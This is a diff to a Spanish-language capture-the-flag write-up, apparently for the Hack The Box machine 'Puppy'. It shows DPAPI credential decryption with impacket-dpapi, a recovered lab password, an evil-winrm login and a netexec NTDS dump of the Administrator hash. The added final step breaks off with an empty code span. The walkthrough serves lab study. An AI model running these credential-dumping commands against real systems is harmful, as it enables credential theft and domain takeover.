@@ -265,7 +265,7 @@ Nos tendremos que traer las dos con `copy <ruta> z:\masterkey_blob` y ahora `cop
 Usaremos [[impacket-dpapi]] podemos derivar la clave para descifrar la masterkey para obtener una clave que nos permita descifrar el credential_blob
 `impacket-dpapi masterkey -file masterkey_blob -sid S-1-5-21-1487982659-1829050783-2281216199-1107` y la password de `STEPH`
 
- Nos da la decripted key que es la que podemos usar contra el credentia_blob y ver la contraseña en texto claro `0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`
+ Nos da la decripted key que es la que podemos usar contra el credential_blob y ver la contraseña en texto claro `0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`
 
  Ejecutaremos
  `impacket-dpapi credential -file credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`
@@ -274,5 +274,11 @@ Usaremos [[impacket-dpapi]] podemos derivar la clave para descifrar la masterkey
 [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025!
  ```
 
-Como es miebro de Administrador y de Remote manager accedemos con [[EVIL_WINRM]]
+Como es miembro de Administrador y de Remote manager accedemos con [[EVIL_WINRM]]
 `evil-winrm -i 10.10.11.70 -u "steph.cooper_adm" -p 'FivethChipOnItsWay2025!'`
+
+Para poder acceder como usuario Administrator usaremos [[CRACKMAPEXEC-NETEXEC]] para obtener el hash del usuario:
+`netexec smb $IP -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' --ntds vss --user Administrator`
+
+Y con el hash nos podremos conectar como Administrator con [[EVIL_WINRM]] 
+``
